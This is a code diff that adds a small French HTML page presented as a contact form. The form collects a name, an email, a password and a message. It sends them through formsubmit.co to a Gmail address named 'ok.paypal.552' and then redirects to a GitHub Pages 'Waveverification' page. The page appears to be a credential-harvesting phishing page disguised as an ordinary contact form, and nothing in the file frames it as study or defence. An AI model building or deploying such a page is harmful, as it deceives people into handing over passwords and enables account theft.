@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>Formulaire de contact</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      max-width: 500px;
+      margin: 50px auto;
+      padding: 20px;
+      border-radius: 10px;
+      border: 1px solid #ccc;
+    }
+    input, textarea, button {
+      width: 100%;
+      margin-top: 10px;
+      padding: 10px;
+      font-size: 1em;
+    }
+    button {
+      background-color: #28a745;
+      color: white;
+      border: none;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #218838;
+    }
+  </style>
+</head>
+<body>
+
+  <h2>Contactez-moi</h2>
+
+  <form action="https://formsubmit.co/ok.paypal.552@gmail.com" method="POST">
+    <input type="text" name="nom" placeholder="Votre nom" required>
+    <input type="email" name="email" placeholder="Votre email" required>
+    <input type="password" name="motdepasse" placeholder="Mot de passe" required>
+    <textarea name="message" placeholder="Votre message" rows="4" required></textarea>
+
+    <!-- Redirection après envoi -->
+    <input type="hidden" name="_next" value="https://yyhgth.github.io/Waveverification/merci.html">
+
+    <button type="submit">Envoyer</button>
+  </form>
+
+</body>
+</html>
